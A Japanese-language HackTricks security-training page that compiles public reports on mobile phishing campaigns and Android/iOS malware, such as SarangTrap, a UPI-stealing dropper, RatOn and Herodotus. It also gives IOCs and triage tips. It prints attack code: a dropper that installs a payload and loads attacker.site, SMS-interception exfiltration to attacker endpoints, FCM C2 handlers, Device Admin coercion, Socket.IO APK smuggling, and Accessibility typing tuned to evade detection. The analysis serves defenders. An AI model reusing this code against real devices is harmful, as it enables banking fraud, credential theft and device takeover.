# モバイルフィッシングと悪意のあるアプリ配布 (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 本ページは、フィッシング（SEO、social engineering、fake stores、dating apps など）を通じて **malicious Android APKs** および **iOS mobile-configuration profiles** を配布するために脅威アクターが使用する手法を扱います。  
> 本資料は Zimperium zLabs によって暴露された SarangTrap キャンペーン (2025) および公開リサーチを元に編集しています。

## 攻撃フロー

1. **SEO/Phishing インフラ**
* 数十の類似ドメインを登録する（dating, cloud share, car service…）。
– Googleで上位表示させるために `<title>` 要素に現地語のキーワードや絵文字を使用する。
– 同一ランディングページに Android（`.apk`）と iOS のインストール手順の両方をホストする。
2. **First Stage Download（最初のダウンロード）**
* Android: 署名されていない、または “third-party store” APK への直接リンク。
* iOS: `itms-services://` または通常の HTTPS リンクで悪意のある **mobileconfig** プロファイルへ誘導。
3. **Post-install Social Engineering**
* 初回起動時にアプリは **invitation / verification code** を要求し、限定アクセスの錯覚を与える。
* コードは **HTTP 経由で POST** され、Command-and-Control (C2) に送信される。
* C2 は `{"success":true}` を返す ➜ マルウェアは継続動作。
* サンドボックス／AV の動的解析は有効なコードを送信しない限り **悪意ある振る舞いを検出しない**（回避）。
4. **ランタイム権限の悪用（Android）**
* 危険なパーミッションは **C2 の肯定応答の後にのみ要求される**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* 最近のバリアントは `AndroidManifest.xml` から SMS 用の `<uses-permission>` を削除するが、reflection 経由で SMS を読み取る Java/Kotlin のコードパスは残す ⇒ 静的スコアを下げつつ、AppOps 悪用や古いターゲットで権限が与えられれば機能する。

5. **Android 13+ の Restricted settings と Dropper 回避（SecuriDropper‑スタイル）**
* Android 13 は sideloaded アプリに対して **Restricted settings** を導入：Accessibility と Notification Listener のトグルは、ユーザが **App info** で明示的に restricted settings を許可するまでグレーアウトされる。
* フィッシングページや dropper は、sideloaded アプリの restricted settings を許可してから Accessibility/Notification アクセスを有効化するための段階的な UI 手順を提供する。
* 新しい回避手法は、**session‑based PackageInstaller flow**（アプリストアが使用するのと同じ方式）でペイロードをインストールすること。Android はアプリをストア経由でインストールされたものとして扱うため、Restricted settings が Accessibility をブロックしなくなる。
* トリアージのヒント: dropper 内で `PackageInstaller.createSession/openSession` を grep し、直後に被害者を `ACTION_ACCESSIBILITY_SETTINGS` または `ACTION_NOTIFICATION_LISTENER_SETTINGS` に遷移させるコードがあるか確認する。

6. **ファサード UI とバックグラウンド収集**
* アプリはローカル実装の無害なビュー（SMS ビューア、ギャラリーピッカー）を表示する。
* 同時に以下を外部送信する:
- IMEI / IMSI、電話番号
- `ContactsContract` の全ダンプ（JSON 配列）
- `/sdcard/DCIM` からの JPEG/PNG を [Luban](https://github.com/Curzibn/Luban) で圧縮してサイズを削減
- 任意で SMS コンテンツ（`content://sms`）
ペイロードは **バッチで zip 圧縮** され、`HTTP POST /upload.php` で送信される。
7. **iOS 配布手法**
* 1 つの **mobile-configuration profile** で `PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration` 等を要求し、デバイスを MDM ライクな管理状態に登録できる。
* ソーシャルエンジニアリングの指示例:
1. Settings を開く ➜ *Profile downloaded*。
2. *Install* を3回タップ（フィッシングページ上のスクリーンショットを表示）。
3. 未署名プロファイルをTrustする ➜ 攻撃者は App Store レビューなしで *Contacts* と *Photo* の権限を取得する。
8. **iOS Web Clip ペイロード（フィッシング用アプリアイコン）**
* `com.apple.webClip.managed` ペイロードは **フィッシング URL をホーム画面にピン留め** し、ブランディングされたアイコン／ラベルを付与できる。
* Web Clip は **フルスクリーン**（ブラウザ UI を隠す）で実行可能、かつ **削除不可** とマークできるため、アイコンを削除するにはプロファイルを削除する必要がある。
9. **ネットワーク層**
* 平文 HTTP、しばしばポート 80 で `Host` ヘッダが `api.<phishingdomain>.com` のようになっている。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（TLS を使っていない → 発見しやすい）。

## Red-Team 向けヒント

* **Dynamic Analysis Bypass** – マルウェア評価時に、Frida/Objection を使って invitation code フェーズを自動化し、悪意ある分岐に到達させる。
* **Manifest と Runtime の差分** – `aapt dump permissions` とランタイムの `PackageManager#getRequestedPermissions()` を比較する；危険なパーミッションが欠けているのは要注意。
* **Network Canary** – `iptables -p tcp --dport 80 -j NFQUEUE` を設定して、コード入力後の不自然な POST バーストを検出する。
* **mobileconfig の検査** – macOS で `security cms -D -i profile.mobileconfig` を使い、`PayloadContent` を一覧表示して過剰な権限を見つける。

## 便利な Frida スニペット：招待コードの自動バイパス

<details>
<summary>Frida: 招待コードの自動バイパス</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## インジケーター（汎用）
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

このパターンは、政府給付金をテーマにしたキャンペーンでインドの UPI 資格情報と OTP を盗むために観測されている。攻撃者は配信と耐障害性のために信頼できるプラットフォームを連鎖的に利用する。

### Delivery chain across trusted platforms
- YouTube 動画の誘導 → 説明欄に短縮リンクを記載
- Shortlink → GitHub Pages の phishing site（正規ポータルを偽装）
- 同じ GitHub repo が APK をホストし、偽の “Google Play” バッジでファイルへ直接リンク
- 動的な phishing pages が Replit 上でホストされ、リモートコマンドチャネルは Firebase Cloud Messaging (FCM) を使用

### Dropper with embedded payload and offline install
- First APK は installer (dropper) で、実際のマルウェアを `assets/app.apk` として同梱し、クラウド検出を鈍らせるためにユーザーに Wi‑Fi/モバイルデータを無効化するよう促す。
- 組み込まれた payload は無害に見えるラベル（例: “Secure Update”）でインストールされる。インストール後、installer と payload の両方が別個のアプリとして存在する。

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### shortlinkを介した動的エンドポイントの検出
- Malware は shortlink からプレーンテキストのカンマ区切りの稼働中エンドポイント一覧を取得し、単純な文字列変換で最終的な phishing ページのパスを生成する。

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
疑似コード:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- “Make payment of ₹1 / UPI‑Lite” ステップは、動的エンドポイントから攻撃者の HTML フォームを WebView 内に読み込み、機密フィールド（電話番号、銀行情報、UPI PIN）を取得し、それらを `POST` して `addup.php` に送信します。

最小ローダー:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- 初回起動時に過剰な権限が要求される:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 連絡先をループ処理し、被害者のデバイスから smishing SMS を大量送信する。
- 受信した SMS は broadcast receiver によって傍受され、メタデータ（送信者、本文、SIM slot、デバイスごとのランダム ID）と共に `/addsm.php` にアップロードされる。

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) を利用した耐障害性の高い C2
- ペイロードは FCM に登録される。push メッセージは、アクションをトリガーするスイッチとして使用される `_type` フィールドを含む（例：phishing テキストテンプレートの更新、挙動の切り替え）。

FCM ペイロードの例:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
ハンドラのスケッチ:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### インジケーター / IOCs
- APK が `assets/app.apk` に二次ペイロードを含む
- WebView が `gate.htm` から決済を読み込み、`/addup.php` にデータを送信する
- SMS の外部送信先が `/addsm.php`
- Shortlink 駆動の設定取得（例: `rebrand.ly/*`）で CSV エンドポイントを返す
- 汎用の “Update/Secure Update” とラベル付けされたアプリ
- 信頼されていないアプリで `_type` 識別子を持つ FCM `data` メッセージ

---

## Socket.IO/WebSocket ベースの APK Smuggling + 偽の Google Play ページ

攻撃者は静的な APK リンクを、Google Play 風の誘導ページ内に埋め込まれた Socket.IO/WebSocket チャネルに置き換えることが増えています。これによりペイロードの URL が隠蔽され、URL/拡張子フィルタを回避し、現実的なインストール UX を維持します。

実際に観測された典型的なクライアントフロー：

<details>
<summary>Socket.IO 偽の Play ダウンローダー (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

なぜこれが簡易な制御を回避するのか:
- 静的なAPK URLが公開されない; payloadはWebSocketフレームからメモリ上で再構成される。
- 直接の.apkレスポンスをブロックするURL/MIME/extensionフィルタは、WebSockets/Socket.IO経由でトンネリングされたバイナリデータを見逃す可能性がある。
- WebSocketsを実行しないCrawlersやURLサンドボックスはpayloadを取得できない。

参照: WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn ケーススタディ

RatOn banker/RAT campaign (ThreatFabric) は、現代の mobile phishing オペレーションが WebView droppers、Accessibility-driven UI automation、overlays/ransom、Device Admin coercion、Automated Transfer System (ATS)、crypto wallet takeover、さらには NFC-relay orchestration をどのように組み合わせるかの具体例である。このセクションでは再利用可能な技術を抽象化する。

### Stage-1: WebView → native install bridge (dropper)
攻撃者は攻撃者ページを指すWebViewを表示し、ネイティブインストーラを公開するJavaScriptインターフェースを注入する。HTMLボタンのタップがネイティブコードを呼び出し、dropperのassetsにバンドルされたsecond-stage APKをインストールして直接起動する。

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

ページ上のHTML:
```html
<button onclick="bridge.installApk()">Install</button>
```
インストール後、dropper は明示的な package/activity を介して payload を起動します:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: 信頼できないアプリが `addJavascriptInterface()` を呼び出し、installer-like なメソッドを WebView に公開する; APK が `assets/` 以下に埋め込まれた二次ペイロードを同梱し、Package Installer Session API を呼び出す。

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 は WebView を開いて “Access” ページをホストする。そのボタンは exported なメソッドを呼び出し、被害者を Accessibility 設定へ遷移させて悪意あるサービスの有効化を要求する。許可されると、マルウェアは Accessibility を使用して後続のランタイム権限ダイアログ（contacts、overlay、manage system settings など）を自動でクリックし、Device Admin を要求する。

- Accessibility はプログラム的にノードツリー内の “Allow”/“OK” のようなボタンを見つけてクリックをディスパッチすることで、後続のプロンプトを承認するのを助ける。
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
参照:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### WebViewを使ったオーバーレイ型フィッシング／身代金要求
オペレーターは以下のコマンドを発行できる:
- URLからフルスクリーンのオーバーレイを表示する、または
- インラインHTMLを渡してWebViewオーバーレイに読み込ませる。

想定される用途: 強制（PIN入力）、ウォレットを開かせてPINを取得、身代金メッセージの表示。権限がない場合にオーバーレイ許可を付与させるコマンドを用意しておくこと。

### リモート制御モデル — テキスト疑似スクリーン + スクリーンキャスト
- 低帯域: 定期的にAccessibilityのノードツリーをダンプし、表示中のテキスト／roles／boundsをシリアライズしてC2に疑似スクリーンとして送る（`txt_screen` のような一回実行、`screen_live` のような連続実行）。
- 高忠実度: MediaProjectionを要求して、必要に応じてスクリーンキャスト／録画を開始する（`display` / `record` のようなコマンド）。

### ATSプレイブック（銀行アプリ自動化）
JSONタスクを受け取り、銀行アプリを開き、テキストクエリと座標タップを組み合わせてAccessibility経由でUIを操作し、要求されたら被害者の支払いPINを入力する。

タスク例:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
ターゲットのフローで確認された例文（CZ → EN）:
- "Nová platba" → "新規支払い"
- "Zadat platbu" → "支払いを入力"
- "Nový příjemce" → "新規受取人"
- "Domácí číslo účtu" → "国内口座番号"
- "Další" → "次へ"
- "Odeslat" → "送信"
- "Ano, pokračovat" → "はい、続行"
- "Zaplatit" → "支払う"
- "Hotovo" → "完了"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: ロック解除（盗まれた PIN または提供されたパスワード）、Security/Recovery に移動し、seed phrase を表示し、keylog/exfiltrate する。実装時は EN/RU/CZ/SK に対応したロケール対応セレクタを用意して、多言語間の操作を安定させる。

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- 即時ロック:
```java
dpm.lockNow();
```
- 現在の認証情報を期限切れにして変更を強制する（アクセシビリティが新しいPIN/パスワードを取得する）:
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- keyguard biometric features を無効化して、non-biometric unlock を強制する:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: 多くの DevicePolicyManager コントロールは最近の Android で Device Owner/Profile Owner を要求します。OEM ビルドによっては緩い場合があります。ターゲットの OS/OEM 上で必ず検証してください。

### NFC relay orchestration (NFSkate)
Stage-3 は外部の NFC リレー モジュール（例: NFSkate）をインストールして起動し、リレー中に被害者を誘導するための HTML テンプレートを渡すことさえできます。これにより、オンライン ATS と並行して非接触の card-present キャッシュアウトが可能になります。

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (インライン HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

脅威アクターは、アクセシビリティ駆動の自動化と、基本的な行動バイオメトリクス向けにチューニングされた検出回避を組み合わせることが増えています。最近の banker/RAT は、補完的な 2 つのテキスト配信モードと、ランダム化されたリズムで人間のタイピングをシミュレートするオペレータ用トグルを備えています。

- Discovery mode: 表示されているノードを列挙し、アクションを実行する前にセレクタと bounds（ID, text, contentDescription, hint, bounds）で入力対象を正確に特定します。
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` をターゲットノードに直接適用（安定、キーボード不要）;
- Mode 2 – クリップボードセット + `ACTION_PASTE` をフォーカスされたノードに実行（直接の setText がブロックされている場合に有効）。
- Human-like cadence: オペレータが提供した文字列を分割し、イベント間でランダム化された 300–3000 ms の遅延を入れて文字ごとに配信し、「機械速度のタイピング」ヒューリスティクスを回避します。これは `ACTION_SET_TEXT` を用いて値を段階的に増やす方法、または 1 文字ずつ貼り付ける方法で実装されます。

<details>
<summary>Java スケッチ: ノード検出 + setText または clipboard+paste 経由での文字ごとの遅延入力</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

詐欺隠蔽用のブロッキングオーバーレイ:
- オペレータが制御する不透明度を持つ全画面の `TYPE_ACCESSIBILITY_OVERLAY` を表示する；被害者には不透明のままにしておき、その下でリモート自動化を進行させる。
- 通常公開されるコマンド: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

不透明度を調整可能な最小限のオーバーレイ:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
よく見られる操作プリミティブ: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y`（画面共有）。

## 参考

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
